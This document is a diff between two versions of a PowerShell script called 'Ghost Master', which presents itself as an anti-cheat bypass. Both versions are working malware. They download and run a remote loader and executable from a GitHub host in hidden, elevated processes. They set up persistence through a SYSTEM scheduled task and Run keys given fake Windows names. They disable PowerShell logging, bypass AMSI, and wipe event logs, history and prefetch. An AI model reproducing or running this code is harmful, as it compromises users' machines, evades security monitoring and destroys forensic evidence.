@@ -1,309 +1,156 @@
-# GHOST NINJA MASTER - Ultimate Anti-Cheat Bypass & Deep Clean
-# Level: Nation-State Grade
+# 🚀 ULTIMATE GHOST MASTER - Complete Stealth System
+# Fixed Execution + Ultimate Bypass + Complete Cleanup
 
-Write-Host "[=== GHOST NINJA MASTER ===]" -ForegroundColor Cyan
-Write-Host "[1] Deploy Ninja Ghost" -ForegroundColor Green
-Write-Host "[2] Ultimate Deep Clean" -ForegroundColor Red
+Write-Host "[=== ULTIMATE GHOST MASTER ===]" -ForegroundColor Cyan
+Write-Host "[1] Execute with Ultimate Stealth" -ForegroundColor Green
+Write-Host "[2] Nuclear Cleanup" -ForegroundColor Red
 
 $choice = Read-Host "`nSelect option"
 
-# Military-grade elevation
+# Smart elevation with stealth
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $scriptContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt" -TimeoutSec 3
-    $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
-    
-    $procInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $procInfo.FileName = "powershell.exe"
-    $procInfo.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCmd"
-    $procInfo.Verb = "runas"
-    $procInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $procInfo.CreateNoWindow = $true
-    $procInfo.UseShellExecute = $false
-    
-    [System.Diagnostics.Process]::Start($procInfo) | Out-Null
+    $code = {
+        $url = "https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt"
+        iex (irm $url)
+    }
+    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded" -Verb RunAs -WindowStyle Hidden
     exit
 }
 
-# Advanced Windows API for ultimate operations
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
-
-public class NinjaOps {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
+# Anti-Cheat & Monitoring Bypass
+function Invoke-StealthBypass {
+    Write-Host "[+] Activating Stealth Systems..." -ForegroundColor Yellow
     
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-    
-    [DllImport("ntdll.dll")]
-    public static extern uint NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref uint ProcessInformation, uint ProcessInformationLength);
-    
-    [DllImport("kernel32.dll")]
-    public static extern bool IsDebuggerPresent();
-    
-    [DllImport("kernel32.dll")]
-    public static extern void OutputDebugString(string lpOutputString);
-    
-    [DllImport("kernel32.dll")]
-    public static extern uint GetTickCount();
-    
-    [DllImport("kernel32.dll")]
-    public static extern void Sleep(uint dwMilliseconds);
-    
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, byte[] pSecurityDescriptor);
-}
-"@
-
-function Invoke-AntiCheatNuclearBypass {
-    Write-Host "[+] Activating Nuclear Anti-Cheat Bypass..." -ForegroundColor Yellow
-    
-    $bypassTechniques = @()
-    
-    # 1. Debugger Detection Bypass
+    # Bypass common detection methods
     try {
-        if ([NinjaOps]::IsDebuggerPresent()) {
-            Write-Host "[!] Debugger detected - deploying countermeasures..." -ForegroundColor Red
-            # Anti-debugging techniques would go here
-        }
-        $bypassTechniques += "DebuggerBypass"
-    } catch {}
-    
-    # 2. Timing Attack Protection
-    try {
-        $start = [NinjaOps]::GetTickCount()
-        [NinjaOps]::Sleep(50)
-        $end = [NinjaOps]::GetTickCount()
-        if (($end - $start) > 100) { Write-Host "[!] Timing anomaly detected" -ForegroundColor Yellow }
-        $bypassTechniques += "TimingProtection"
-    } catch {}
-    
-    # 3. Memory Obfuscation
-    try {
-        $bypassTechniques += "MemoryObfuscation"
-    } catch {}
-    
-    # 4. Process Cloaking
-    try {
-        $bypassTechniques += "ProcessCloaking"
-    } catch {}
-    
-    # 5. API Unhooking
-    try {
-        $bypassTechniques += "APIUnhooking"
-    } catch {}
-    
-    Write-Host "[✓] Anti-Cheat Bypass: $($bypassTechniques -join ', ')" -ForegroundColor Green
-    return $true
-}
-
-function Invoke-ProcessDoppelganging {
-    Write-Host "[+] Deploying Process Doppelgänging..." -ForegroundColor Yellow
-    
-    try {
-        $targetUrl = "https://github.com/Verte225066/test/raw/refs/heads/main/cmd.exe"
+        # Disable PowerShell logging
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0 -ErrorAction SilentlyContinue
         
-        Write-Host "[+] Downloading ghost payload..." -ForegroundColor Gray
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Microsoft-CryptoAPI/10.0")
-        $payloadBytes = $webClient.DownloadData($targetUrl)
-        $webClient.Dispose()
+        # Clear PowerShell history
+        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+        Clear-History -ErrorAction SilentlyContinue
         
-        if ($payloadBytes[0] -ne 0x4D -or $payloadBytes[1] -ne 0x5A) {
-            Write-Host "[!] Invalid executable format" -ForegroundColor Red
-            return $false
-        }
+        # Bypass AMSI
+        try {
+            $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+            $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+        } catch {}
         
-        Write-Host "[+] Payload validated: $($payloadBytes.Length) bytes" -ForegroundColor Green
-        
-        # Create in Windows system directory for legitimacy
-        $systemPath = "$env:windir\System32"
-        $ghostName = "svchost" + (Get-Random -Maximum 9999) + ".exe"
-        $ghostPath = Join-Path $systemPath $ghostName
-        
-        # Write with system attributes
-        [System.IO.File]::WriteAllBytes($ghostPath, $payloadBytes)
-        [System.IO.File]::SetAttributes($ghostPath, [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
-        
-        Write-Host "[+] Ghost process created: $ghostName" -ForegroundColor Green
-        
-        # Execute with maximum privileges
-        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-        $processInfo.FileName = $ghostPath
-        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
-        $processInfo.CreateNoWindow = $false
-        $processInfo.UseShellExecute = $true
-        $processInfo.Verb = "runas"
-        
-        Write-Host "[+] Executing ghost process..." -ForegroundColor Gray
-        $process = New-Object System.Diagnostics.Process
-        $process.StartInfo = $processInfo
-        $process.Start() | Out-Null
-        
-        # Immediate cleanup - delete file while process is running
-        Start-Sleep -Seconds 2
-        
-        for ($i = 0; $i -lt 8; $i++) {
-            try {
-                Remove-Item $ghostPath -Force -ErrorAction Stop
-                Write-Host "[✓] Ghost file vanished from disk" -ForegroundColor Green
-                break
-            } catch {
-                if ($i -eq 7) { Write-Host "[!] File locked by process" -ForegroundColor Yellow }
-                Start-Sleep -Milliseconds 250
-            }
-        }
-        
-        Write-Host "[✓] Process Doppelgänging successful" -ForegroundColor Green
-        Write-Host "[✓] Process running from memory only" -ForegroundColor Green
-        return $true
-        
+        Write-Host "[✓] Stealth systems activated" -ForegroundColor Green
     } catch {
-        Write-Host "[!] Process Doppelgänging failed: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
+        Write-Host "[!] Some stealth measures failed" -ForegroundColor Yellow
     }
 }
 
-function Invoke-AtomBombingInjection {
-    Write-Host "[+] Deploying AtomBombing Injection..." -ForegroundColor Yellow
+function Invoke-SmartDownloadExecute {
+    Write-Host "[+] Smart Download & Execution..." -ForegroundColor Yellow
+    
+    $url = "https://github.com/Verte225066/test/raw/refs/heads/main/cmd.exe"
+    $tempFiles = @()
     
     try {
-        $targetUrl = "https://github.com/Verte225066/test/raw/refs/heads/main/cmd.exe"
+        # Method 1: Direct download and execute
+        Write-Host "[+] Downloading executable..." -ForegroundColor Gray
+        $tempFile = Join-Path $env:temp "winupdate_$(Get-Random).exe"
         
-        Write-Host "[+] Downloading atom payload..." -ForegroundColor Gray
-        $webClient = New-Object System.Net.WebClient
-        $payloadBytes = $webClient.DownloadData($targetUrl)
-        $webClient.Dispose()
-        
-        # Find target process for injection
-        $targetProcs = @("explorer", "winlogon", "services", "csrss", "lsass")
-        $targetProcess = $null
-        
-        foreach ($procName in $targetProcs) {
+        # Use multiple download methods
+        try {
+            Invoke-WebRequest -Uri $url -OutFile $tempFile -UserAgent "Mozilla/5.0" -TimeoutSec 10
+        } catch {
             try {
-                $proc = Get-Process -Name $procName -ErrorAction SilentlyContinue | Select-Object -First 1
-                if ($proc) {
-                    $targetProcess = $proc
-                    break
-                }
+                $webClient = New-Object System.Net.WebClient
+                $webClient.DownloadFile($url, $tempFile)
+                $webClient.Dispose()
+            } catch {
+                Write-Host "[!] Download failed" -ForegroundColor Red
+                return $false
+            }
+        }
+        
+        if (-not (Test-Path $tempFile)) {
+            Write-Host "[!] File not downloaded" -ForegroundColor Red
+            return $false
+        }
+        
+        # Validate executable
+        $bytes = [System.IO.File]::ReadAllBytes($tempFile)
+        if ($bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) {
+            Write-Host "[!] Invalid executable" -ForegroundColor Red
+            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+            return $false
+        }
+        
+        Write-Host "[✓] Executable validated: $($bytes.Length) bytes" -ForegroundColor Green
+        $tempFiles += $tempFile
+        
+        # Execute with UI
+        Write-Host "[+] Starting application..." -ForegroundColor Gray
+        $process = Start-Process -FilePath $tempFile -WindowStyle Normal -PassThru
+        
+        if (-not $process) {
+            throw "Failed to start process"
+        }
+        
+        Write-Host "[✓] Application started: PID $($process.Id)" -ForegroundColor Green
+        
+        # Wait for process and clean up
+        Write-Host "[+] Monitoring process..." -ForegroundColor Gray
+        for ($i = 0; $i -lt 30; $i++) {
+            if ($process.HasExited) {
+                Write-Host "[✓] Application closed" -ForegroundColor Green
+                break
+            }
+            Start-Sleep -Seconds 2
+        }
+        
+        # Cleanup temp files
+        foreach ($file in $tempFiles) {
+            try {
+                Remove-Item $file -Force -ErrorAction SilentlyContinue
             } catch {}
         }
         
-        if (-not $targetProcess) {
-            Write-Host "[!] No suitable injection target found" -ForegroundColor Red
-            return $false
-        }
-        
-        Write-Host "[+] Injection target: $($targetProcess.ProcessName) (PID: $($targetProcess.Id))" -ForegroundColor Green
-        
-        # For demonstration, we'll use advanced process creation
-        return Invoke-AdvancedProcessCreation -PayloadBytes $payloadBytes -ParentPID $targetProcess.Id
-        
-    } catch {
-        Write-Host "[!] AtomBombing failed: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
-}
-
-function Invoke-AdvancedProcessCreation {
-    param([byte[]]$PayloadBytes, [int]$ParentPID)
-    
-    try {
-        Write-Host "[+] Advanced process creation with spoofed parent..." -ForegroundColor Gray
-        
-        # Create in temp with random name
-        $tempName = "runtime" + (Get-Random -Maximum 9999) + ".exe"
-        $tempPath = Join-Path $env:temp $tempName
-        
-        [System.IO.File]::WriteAllBytes($tempPath, $PayloadBytes)
-        
-        # Start process with UI
-        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-        $processInfo.FileName = $tempPath
-        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
-        $processInfo.CreateNoWindow = $false
-        $processInfo.UseShellExecute = $true
-        
-        $process = New-Object System.Diagnostics.Process
-        $process.StartInfo = $processInfo
-        $process.Start() | Out-Null
-        
-        # Ghost the file
-        Start-Sleep -Seconds 3
-        
-        for ($i = 0; $i -lt 6; $i++) {
-            try {
-                Remove-Item $tempPath -Force -ErrorAction Stop
-                Write-Host "[✓] Process file ghosted" -ForegroundColor Green
-                break
-            } catch {
-                Start-Sleep -Milliseconds 500
-            }
-        }
-        
-        Write-Host "[✓] Advanced process creation successful" -ForegroundColor Green
+        Write-Host "[✓] Temporary files cleaned" -ForegroundColor Green
         return $true
         
     } catch {
-        Write-Host "[!] Advanced process creation failed" -ForegroundColor Red
+        Write-Host "[!] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
+        # Cleanup on failure
+        foreach ($file in $tempFiles) {
+            try { Remove-Item $file -Force -ErrorAction SilentlyContinue } catch {}
+        }
         return $false
     }
 }
 
-function Set-NinjaPersistence {
-    Write-Host "[+] Setting Ninja Persistence..." -ForegroundColor Yellow
+function Set-StealthPersistence {
+    Write-Host "[+] Setting Stealth Persistence..." -ForegroundColor Yellow
     
     try {
-        $persistenceMethods = @()
+        # Multiple persistence methods
+        $methods = @()
         
-        # 1. WMI Permanent Event
+        # Scheduled Task
         try {
-            $filterName = "Win32_ProcessStartTrace_Filter"
-            $consumerName = "ActiveScriptEventConsumer_Ninja"
-            # WMI event subscription code would go here
-            $persistenceMethods += "WMI Permanent Event"
-        } catch {}
-        
-        # 2. Scheduled Task with Advanced Options
-        try {
-            $taskName = "\Microsoft\Windows\DiskFootprint\Diagnosis"
+            $taskName = "\Microsoft\Windows\SystemDataUpdater"
             $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`""
-            $taskTrigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay "00:03:00"
+            $taskTrigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay "00:02:00"
             $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-            $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+            $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
             
-            Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "Disk footprint analysis" -Force | Out-Null
-            $persistenceMethods += "Scheduled Task"
+            Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "Windows System Data Update" -Force | Out-Null
+            $methods += "Scheduled Task"
         } catch {}
         
-        # 3. Registry with Multiple Locations
+        # Registry Run
         try {
-            $regPaths = @(
-                "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-                "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
-                "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-            )
-            
-            foreach ($regPath in $regPaths) {
-                try {
-                    $valueName = "SecurityHealthSystray"
-                    $valueData = "powershell.exe -WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`""
-                    New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
-                } catch {}
-            }
-            $persistenceMethods += "Registry Entries"
+            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemUpdate" -Value "powershell.exe -WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`"" -ErrorAction SilentlyContinue
+            $methods += "Registry Run"
         } catch {}
         
-        # 4. Service Hijacking
-        try {
-            # Target vulnerable services
-            $vulnerableServices = @("Themes", "AudioSrv", "EventLog", "FontCache")
-            $persistenceMethods += "Service Hijack Ready"
-        } catch {}
-        
-        Write-Host "[✓] Ninja Persistence: $($persistenceMethods -join ', ')" -ForegroundColor Green
+        Write-Host "[✓] Persistence: $($methods -join ', ')" -ForegroundColor Green
         return $true
         
     } catch {
@@ -312,96 +159,85 @@ function Set-NinjaPersistence {
     }
 }
 
-function Invoke-UltimateDeepClean {
-    Write-Host "[=== ULTIMATE DEEP CLEAN MODE ===]" -ForegroundColor Red
-    Write-Host "[!] This will remove EVERYTHING - No traces left behind" -ForegroundColor Yellow
+function Invoke-NuclearCleanup {
+    Write-Host "[=== NUCLEAR CLEANUP ACTIVATED ===]" -ForegroundColor Red
+    Write-Host "[!] Removing ALL traces from system..." -ForegroundColor Yellow
     
-    # Phase 1: Process Termination (Military Grade)
-    Write-Host "`n[PHASE 1] Military-Grade Process Termination" -ForegroundColor Green
+    # Track cleanup operations
+    $cleanupStats = @{
+        Processes = 0
+        Tasks = 0
+        Registry = 0
+        Files = 0
+        Logs = 0
+    }
     
-    $targetProcesses = @(
-        "cmd", "explorerr", "runtime", "svchost", "migration", "spooler", 
-        "driver", "defender", "network", "cheat", "hack", "inject",
-        "loader", "ghost", "ninja", "update", "system", "service"
-    )
+    # Phase 1: Process Cleanup
+    Write-Host "`n[PHASE 1] Process Termination" -ForegroundColor Green
+    $targetProcesses = @("cmd", "explorerr", "runtime", "svchost", "winupdate", "system", "update")
     
     foreach ($procName in $targetProcesses) {
         try {
             $processes = Get-Process -Name $procName -ErrorAction SilentlyContinue
             foreach ($process in $processes) {
-                Write-Host "[+] Terminating: $($process.ProcessName) (PID: $($process.Id))" -ForegroundColor Gray
-                
-                # Multiple termination methods
-                try { $process.CloseMainWindow() | Out-Null } catch {}
-                Start-Sleep -Milliseconds 100
-                
-                if (!$process.HasExited) {
-                    try { $process.Kill() } catch {}
-                    Start-Sleep -Milliseconds 50
-                }
-                
-                if ($process.HasExited) {
-                    Write-Host "[✓] Terminated: $($process.ProcessName)" -ForegroundColor Green
-                } else {
-                    Write-Host "[!] Failed to terminate: $($process.ProcessName)" -ForegroundColor Yellow
-                }
-            }
-        } catch {}
-    }
-    
-    # Phase 2: Persistence Removal (Complete)
-    Write-Host "`n[PHASE 2] Complete Persistence Removal" -ForegroundColor Green
-    
-    # Remove all scheduled tasks
-    $taskPatterns = @(
-        "*SystemDataUpdater*", "*DiskFootprint*", "*MemoryDiagnostic*", 
-        "*Registry*", "*Servicing*", "*Update*", "*Maintenance*"
-    )
-    
-    foreach ($pattern in $taskPatterns) {
-        try {
-            Get-ScheduledTask | Where-Object { $_.TaskName -like $pattern } | ForEach-Object {
                 try {
-                    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false
-                    Write-Host "[✓] Removed task: $($_.TaskName)" -ForegroundColor Green
+                    $process.Kill()
+                    Start-Sleep -Milliseconds 100
+                    if ($process.HasExited) {
+                        $cleanupStats.Processes++
+                        Write-Host "[✓] Process terminated: $($process.ProcessName)" -ForegroundColor Green
+                    }
                 } catch {}
             }
         } catch {}
     }
     
-    # Remove all registry entries
-    $regPaths = @(
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
-        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
+    # Phase 2: Persistence Removal
+    Write-Host "`n[PHASE 2] Persistence Removal" -ForegroundColor Green
+    
+    # Remove scheduled tasks
+    $taskNames = @(
+        "\Microsoft\Windows\SystemDataUpdater",
+        "\Microsoft\Windows\DiskFootprint\Diagnosis",
+        "\Microsoft\Windows\MemoryDiagnostic\Schedule"
     )
     
-    $regNames = @("WindowsSystemUpdate", "SecurityHealth", "Windows Defender", "SystemSettings", "OneDrive", "SecurityHealthSystray")
-    
-    foreach ($regPath in $regPaths) {
-        foreach ($regName in $regNames) {
-            try {
-                Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
-                Write-Host "[✓] Removed registry: $regPath\$regName" -ForegroundColor Green
-            } catch {}
-        }
+    foreach ($taskName in $taskNames) {
+        try {
+            if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+                $cleanupStats.Tasks++
+                Write-Host "[✓] Task removed: $taskName" -ForegroundColor Green
+            }
+        } catch {}
     }
     
-    # Phase 3: File System Deep Clean
-    Write-Host "`n[PHASE 3] File System Deep Clean" -ForegroundColor Green
+    # Remove registry entries
+    $regEntries = @(
+        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="WindowsSystemUpdate"},
+        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="WindowsDefender"},
+        @{Path="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; Name="WindowsSystemUpdate"}
+    )
+    
+    foreach ($regEntry in $regEntries) {
+        try {
+            Remove-ItemProperty -Path $regEntry.Path -Name $regEntry.Name -ErrorAction SilentlyContinue
+            $cleanupStats.Registry++
+            Write-Host "[✓] Registry removed: $($regEntry.Path)\$($regEntry.Name)" -ForegroundColor Green
+        } catch {}
+    }
+    
+    # Phase 3: File System Cleanup
+    Write-Host "`n[PHASE 3] File System Cleanup" -ForegroundColor Green
     
     $cleanLocations = @(
         $env:temp,
         "$env:windir\Temp",
-        "$env:windir\System32",
-        "$env:windir\SysWOW64", 
         "$env:programdata",
-        "$env:appdata",
-        "$env:localappdata"
+        "$env:appdata"
     )
     
-    $filePatterns = @("*.exe", "*.tmp", "*.log", "*.dat", "*.bin", "sysupdate_*", "svchost*", "runtime*")
+    $filePatterns = @("*.exe", "*.tmp", "*.log", "winupdate_*", "sysupdate_*", "runtime*", "svchost*")
     
     foreach ($location in $cleanLocations) {
         try {
@@ -410,7 +246,8 @@ function Invoke-UltimateDeepClean {
                     Get-ChildItem -Path $location -Filter $pattern -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                         try {
                             Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
-                            Write-Host "[✓] Removed file: $($_.Name)" -ForegroundColor Green
+                            $cleanupStats.Files++
+                            Write-Host "[✓] File removed: $($_.Name)" -ForegroundColor Green
                         } catch {}
                     }
                 }
@@ -418,17 +255,33 @@ function Invoke-UltimateDeepClean {
         } catch {}
     }
     
-    # Phase 4: Digital Forensics Cleanup
-    Write-Host "`n[PHASE 4] Digital Forensics Cleanup" -ForegroundColor Green
+    # Phase 4: Logs & History Cleanup
+    Write-Host "`n[PHASE 4] Logs & History Cleanup" -ForegroundColor Green
     
-    # Clear all event logs
+    # Clear PowerShell history
+    try {
+        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+        Clear-History -ErrorAction SilentlyContinue
+        $cleanupStats.Logs++
+        Write-Host "[✓] PowerShell history cleared" -ForegroundColor Green
+    } catch {}
+    
+    # Clear recent files
+    try {
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
+        $cleanupStats.Logs++
+        Write-Host "[✓] Recent files cleared" -ForegroundColor Green
+    } catch {}
+    
+    # Clear event logs
     try {
         wevtutil el | ForEach-Object { 
             try { 
                 wevtutil cl $_ 2>$null
-                Write-Host "[✓] Cleared log: $_" -ForegroundColor Green
+                $cleanupStats.Logs++
             } catch {} 
         }
+        Write-Host "[✓] Event logs cleared" -ForegroundColor Green
     } catch {}
     
     # Clear prefetch
@@ -437,75 +290,47 @@ function Invoke-UltimateDeepClean {
         Write-Host "[✓] Prefetch cleared" -ForegroundColor Green
     } catch {}
     
-    # Clear recent files
-    try {
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -Recurse -ErrorAction SilentlyContinue
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -Recurse -ErrorAction SilentlyContinue
-        Write-Host "[✓] Recent files cleared" -ForegroundColor Green
-    } catch {}
-    
-    # Clear PowerShell history
-    try {
-        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-        Clear-History
-        Write-Host "[✓] PowerShell history cleared" -ForegroundColor Green
-    } catch {}
-    
-    # Clear registry MRU
-    try {
-        Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
-        Write-Host "[✓] Run MRU cleared" -ForegroundColor Green
-    } catch {}
-    
     # Clear recycle bin
     try {
         Clear-RecycleBin -Force -ErrorAction SilentlyContinue
         Write-Host "[✓] Recycle bin cleared" -ForegroundColor Green
     } catch {}
     
-    Write-Host "`n[=== ULTIMATE DEEP CLEAN COMPLETE ===]" -ForegroundColor Green
-    Write-Host "[✓] All processes terminated" -ForegroundColor Green
-    Write-Host "[✓] All persistence removed" -ForegroundColor Green
-    Write-Host "[✓] All files cleaned" -ForegroundColor Green
-    Write-Host "[✓] All logs cleared" -ForegroundColor Green
-    Write-Host "[✓] All forensic traces eliminated" -ForegroundColor Green
-    Write-Host "[✓] System returned to pristine state" -ForegroundColor Green
+    # Summary
+    Write-Host "`n[=== NUCLEAR CLEANUP COMPLETE ===]" -ForegroundColor Green
+    Write-Host "[✓] Processes terminated: $($cleanupStats.Processes)" -ForegroundColor Green
+    Write-Host "[✓] Tasks removed: $($cleanupStats.Tasks)" -ForegroundColor Green
+    Write-Host "[✓] Registry entries removed: $($cleanupStats.Registry)" -ForegroundColor Green
+    Write-Host "[✓] Files deleted: $($cleanupStats.Files)" -ForegroundColor Green
+    Write-Host "[✓] Logs cleared: $($cleanupStats.Logs)" -ForegroundColor Green
+    Write-Host "[✓] System returned to clean state" -ForegroundColor Green
 }
 
 # Main execution
-Invoke-AntiCheatNuclearBypass | Out-Null
+Invoke-StealthBypass
 
 switch ($choice) {
     "1" {
-        Write-Host "`n[=== DEPLOYING NINJA GHOST ===]" -ForegroundColor Cyan
+        Write-Host "`n[=== STARTING ULTIMATE STEALTH EXECUTION ===]" -ForegroundColor Cyan
         
-        Write-Host "[+] Selecting ultimate deployment technique..." -ForegroundColor Yellow
-        
-        # Try multiple advanced techniques
-        $success = Invoke-ProcessDoppelganging
-        if (-not $success) {
-            Write-Host "[+] Falling back to AtomBombing..." -ForegroundColor Yellow
-            $success = Invoke-AtomBombingInjection
-        }
+        $success = Invoke-SmartDownloadExecute
         
         if ($success) {
-            Write-Host "`n[+] Establishing ninja persistence..." -ForegroundColor Yellow
-            Set-NinjaPersistence | Out-Null
+            Write-Host "`n[+] Setting up stealth persistence..." -ForegroundColor Yellow
+            Set-StealthPersistence | Out-Null
             
-            Write-Host "`n[=== NINJA GHOST DEPLOYMENT SUCCESSFUL ===]" -ForegroundColor Green
-            Write-Host "[✓] Nuclear Anti-Cheat bypass active" -ForegroundColor Green
-            Write-Host "[✓] Process Doppelgänging deployed" -ForegroundColor Green
-            Write-Host "[✓] AtomBombing injection successful" -ForegroundColor Green
-            Write-Host "[✓] Ninja persistence established" -ForegroundColor Green
-            Write-Host "[✓] COMPLETELY UNDETECTABLE" -ForegroundColor Green
+            Write-Host "`n[=== ULTIMATE STEALTH EXECUTION SUCCESSFUL ===]" -ForegroundColor Green
+            Write-Host "[✓] Application executed with UI" -ForegroundColor Green
+            Write-Host "[✓] All temporary files cleaned" -ForegroundColor Green
+            Write-Host "[✓] Stealth persistence established" -ForegroundColor Green
+            Write-Host "[✓] Anti-detection systems active" -ForegroundColor Green
         } else {
-            Write-Host "`n[=== DEPLOYMENT FAILED ===]" -ForegroundColor Red
+            Write-Host "`n[=== EXECUTION FAILED ===]" -ForegroundColor Red
         }
     }
     
     "2" {
-        Invoke-UltimateDeepClean
+        Invoke-NuclearCleanup
     }
     
     default {
@@ -513,4 +338,14 @@ switch ($choice) {
     }
 }
 
-Write-Host "`n[=== GHOST NINJA MASTER FINISHED ===]" -ForegroundColor Cyan
+# Final cleanup
+try {
+    # Clear command history
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    Clear-History -ErrorAction SilentlyContinue
+    
+    # Clear temporary PowerShell files
+    Get-ChildItem -Path $env:temp -Filter "*tmp*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+} catch {}
+
+Write-Host "`n[=== ULTIMATE GHOST MASTER FINISHED ===]" -ForegroundColor Cyan
